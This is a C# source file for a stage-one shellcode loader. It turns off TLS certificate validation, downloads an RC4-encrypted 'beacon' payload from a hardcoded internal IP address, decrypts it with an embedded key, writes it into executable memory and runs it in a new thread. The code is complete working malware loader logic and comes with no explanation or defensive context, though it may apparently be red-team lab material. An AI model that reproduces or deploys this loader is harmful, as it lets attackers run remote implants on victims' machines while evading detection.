using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace stage1_rc4
{
    class Program
    {
        private static string rc4_key = "advapidll";
        private static string url = "http://192.168.2.2:9090/beacon_x64.bin.enc";

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        public static void DownloadAndExecute()
        {
            ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
            System.Net.WebClient client = new System.Net.WebClient();
            byte[] shellcode = client.DownloadData(url);
            shellcode = RC4(shellcode, rc4_key);
            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
            Marshal.Copy(shellcode, 0, addr, shellcode.Length);
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
            
            return;
        }

        static void Swap(int[] array, int i, int j)
        {
            int temp = array[i];
            array[i] = array[j];
            array[j] = temp;
        }

        static byte[] RC4(byte[] data, string rc4_key)
        {
            byte[] key = Encoding.UTF8.GetBytes(rc4_key);
            int[] S = new int[256];
            byte[] K = new byte[256];
            byte[] cipher = new byte[data.Length];

            for (int i = 0; i < 256; i++)
            {
                S[i] = i;
                K[i] = key[i % key.Length];
            }

            int j = 0;
            for (int i = 0; i < 256; i++)
            {
                j = (j + S[i] + K[i]) % 256;
                Swap(S, i, j);
            }

            int x = 0, y = 0;
            for (int i = 0; i < data.Length; i++)
            {
                x = (x + 1) % 256;
                y = (y + S[x]) % 256;

                Swap(S, x, y);

                cipher[i] = (byte)(data[i] ^ S[(S[x] + S[y]) % 256]);
            }

            return cipher;
        }

        public static void Main(String[] args)
        {
            DownloadAndExecute();
        }
    }
}
